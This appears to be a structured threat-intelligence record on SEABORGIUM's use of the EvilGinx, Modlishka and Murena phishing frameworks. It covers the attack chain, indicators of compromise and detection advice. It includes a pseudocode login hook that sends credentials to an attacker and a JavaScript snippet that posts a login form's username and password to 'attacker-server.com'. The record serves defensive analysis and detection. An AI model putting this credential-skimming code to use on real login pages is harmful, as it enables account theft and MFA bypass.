package_info.package_name: EvilGinx (and related phishing frameworks: Modlishka, Murena)
package_info.package_manager: open-source (GitHub repositories, not a traditional package manager)
package_info.package_versions: Multiple versions; specific versions not detailed in report
package_info.why_malicious: These open-source phishing frameworks are leveraged by SEABORGIUM to create highly convincing credential harvesting sites that proxy authentication flows to legitimate services, intercepting credentials and session cookies. Their deployment in targeted phishing campaigns, combined with infrastructure designed to evade detection and exfiltrate sensitive data, makes the entire package malicious in this context. The frameworks are specifically used to facilitate real-time phishing attacks, bypassing multi-factor authentication and enabling account takeover.

execution_context.trigger: runtime (when victim visits phishing URL and initiates authentication)
execution_context.file_location: phishing framework server-side code (e.g., EvilGinx main proxy module, nginx configuration)
required_permissions: filesystem (for logging or exfiltration of captured data)
environment_vars (for dynamic configuration of phishing infrastructure)

malicious_snippets.code_language: nginx config / golang / python (varies by framework)
malicious_snippets.code_behavior: At runtime, when a victim visits the phishing URL and initiates authentication, the code proxies authentication requests to the legitimate login portal, intercepts credentials and session cookies from HTTP POST data, and exfiltrates them to attacker infrastructure, enabling account takeover.

malice_analysis.why_suspicious: Intercepting authentication credentials and session cookies during a proxied authentication flow is a hallmark of advanced phishing and session hijacking attacks, enabling attackers to bypass multi-factor authentication.
malice_analysis.violated_expectations: Normal reverse proxies transparently forward requests and responses without extracting or exfiltrating sensitive authentication data; legitimate use would never involve credential harvesting or manipulation of authentication flows.
malice_analysis.similar_legitimate_use: Reverse proxies are legitimately used for load balancing, SSL termination, or security enforcement, but never for credential interception or exfiltration.
key_indicators: Proxying authentication flows to legitimate services with credential/session interception logic
Extraction and logging of credentials or session cookies from HTTP POST data
Exfiltration of sensitive authentication data to attacker-controlled endpoints

execution_context.trigger: runtime (upon victim login attempt via phishing site)
execution_context.file_location: phishing framework plugin/module for credential capture (e.g., custom handler in EvilGinx/Modlishka/Murena)
required_permissions: filesystem (to store captured credentials and session data)

malicious_snippets.code_snippet:
def on_login_post(request):
    creds = extract_credentials(request)
    session = extract_session_cookies(request)
    save_to_file(creds, session)
    send_to_attacker(creds, session)
malicious_snippets.code_behavior: At runtime, upon a victim's login attempt via the phishing site, the code hooks into the login POST handler, extracts submitted credentials and session cookies, saves them locally, and sends them to an attacker-controlled server, resulting in credential and session exfiltration.

malice_analysis.why_suspicious: Capturing and exfiltrating credentials and session cookies from authentication requests is inherently malicious and directly facilitates unauthorized access to victim accounts.
malice_analysis.violated_expectations: Legitimate authentication handlers process credentials solely for verification and do not store or transmit them to external parties; exfiltration of authentication data is never part of normal operations.
malice_analysis.similar_legitimate_use: There is no legitimate use case for exfiltrating user credentials or session cookies from authentication handlers.
key_indicators: Credential and session cookie extraction from authentication requests
Local logging or storage of sensitive authentication data outside of secure credential stores

execution_context.trigger: runtime (when victim enters credentials into phishing login form)
execution_context.file_location: JavaScript injected into phishing login page (client-side code)
required_permissions: network (to send exfiltrated data to attacker-controlled server)

malicious_snippets.code_snippet:
<script>
fetch('https://attacker-server.com/log', {
  method: 'POST',
  body: JSON.stringify({
    username: document.getElementById('username').value,
    password: document.getElementById('password').value
  })
});
</script>
malicious_snippets.code_behavior: At runtime, when a victim enters credentials into the phishing login form, the injected JavaScript captures the entered username and password and sends them via HTTP POST to an attacker-controlled server, resulting in immediate credential exfiltration.

malice_analysis.why_suspicious: Injecting JavaScript to capture and exfiltrate credentials from a login form to an external domain is a classic and highly effective phishing technique.
malice_analysis.violated_expectations: Legitimate login pages only transmit credentials to trusted authentication endpoints and never to unrelated or external domains.
malice_analysis.similar_legitimate_use: Form data may be sent to legitimate authentication APIs within the same domain or trusted infrastructure, but never to unknown or attacker-controlled domains.
key_indicators: JavaScript exfiltration of credentials from login forms
Network requests (fetch/XHR) to attacker-controlled or non-corporate domains
Presence of injected or obfuscated JavaScript in login pages

attack_chain.action: Threat actor sends phishing email containing a malicious link or attachment to the target user.
attack_chain.leads_to: Victim clicks the link and is directed to an attacker-controlled phishing site.

attack_chain.action: Victim visits the phishing site, which proxies the legitimate login page using EvilGinx, Modlishka, or Murena frameworks.
attack_chain.leads_to: Victim is presented with a convincing login page and enters credentials.

attack_chain.action: Phishing framework intercepts credentials and session cookies during the authentication flow.
attack_chain.leads_to: Credentials and session data are exfiltrated to attacker infrastructure.

attack_chain.action: Attacker uses harvested credentials and session cookies to access the victim's email account and set up forwarding rules for persistent access.
attack_chain.leads_to: Attacker achieves ongoing access and can impersonate the victim or steal additional data.

behavioral_signatures: Proxying authentication flows to legitimate services with credential and session interception logic present in server-side code
Injected JavaScript or server-side code exfiltrating credentials to non-corporate or attacker-controlled domains
Phishing sites that closely mimic legitimate login portals but are hosted on suspicious or lookalike domains
Unusual authentication flows where credentials are processed by non-standard infrastructure
file_indicators: Presence of EvilGinx, Modlishka, or Murena framework files or directories on web servers (e.g., evilginx2/, modlishka/, murena/)
Custom plugins or modules for credential/session capture within these frameworks
Injected or unauthorized JavaScript in login pages that sends data to external domains
network_indicators: Outbound HTTP/HTTPS requests to domains such as cache-dns[.]com, cache-pdf[.]com, docs-cache[.]com, officeonline365[.]live, cloud-docs[.]com
Phishing infrastructure using lookalike or typosquatted domains resembling legitimate services
Unusual POST requests from login pages to non-corporate or unrecognized endpoints, especially during authentication
TLS certificates issued to suspicious or recently registered domains mimicking legitimate brands
detection_knowledge.how_to_detect: Monitor web servers for the presence of EvilGinx, Modlishka, or Murena framework files and directories, especially those proxying authentication flows to major cloud providers. Detect JavaScript or server-side code that exfiltrates credentials to external or attacker-controlled domains. Flag network traffic to known phishing domains (see IOCs) and lookalike login portals. Use email security solutions to block or quarantine messages containing links to these domains. Monitor for anomalous authentication activity, such as new email forwarding rules, logins from unexpected locations, or session cookie reuse. Implement automated scanning for unauthorized JavaScript in login pages and for suspicious proxy configurations on web infrastructure.
